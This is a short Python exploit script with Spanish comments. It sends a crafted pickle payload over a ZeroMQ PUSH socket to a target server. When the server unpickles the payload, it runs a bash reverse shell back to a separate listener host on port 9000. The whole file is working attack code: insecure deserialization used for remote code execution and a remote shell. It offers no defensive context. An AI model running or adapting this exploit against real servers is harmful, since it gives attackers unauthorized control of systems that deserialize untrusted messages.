import sys
import zmq

def main():

    #definimos una ip del servidor host que deseamos atacar.
    server_host = '98.76.54.32'
    netcat_host = '12.34.56.78'

    context = zmq.Context()
    zmq_socket = context.socket(zmq.PUSH)
    zmq_socket.connect('tcp://%s:1234' % server_host)
# Atacamos con netcat redirigiendo conexion
    shellcode = "cposix\nsystem\np0\n(S'/bin/bash -i &gt;&amp; /dev/tcp/%s/9000 0&gt;&amp;1'\np1\ntp2\nRp3\n." % netcat_host
    zmq_socket.send(shellcode)
    # we get a reverse shell on the netcat host

if __name__ == "__main__":
    main()
